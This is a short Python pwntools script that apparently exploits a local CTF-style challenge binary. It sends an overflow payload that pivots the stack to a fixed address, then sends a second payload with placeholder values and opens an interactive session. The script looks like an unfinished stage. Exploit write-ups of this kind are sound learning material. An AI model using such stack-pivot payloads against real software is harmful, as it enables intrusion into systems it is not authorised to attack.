from pwn import *

exe = './unexploitable_patched'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
# Doing a stack pivot so that the stack address is known
p1 = 0x10*b"a" + p64(0x601040) + p64(0x40055b)
p.sendline(p1.ljust(255 , b"d"))                            
                                            
p2 = 0x10*b"b" + p64(0x1) + p64(0xdeadbeef) 
p.sendline(p2)


p.interactive()                              

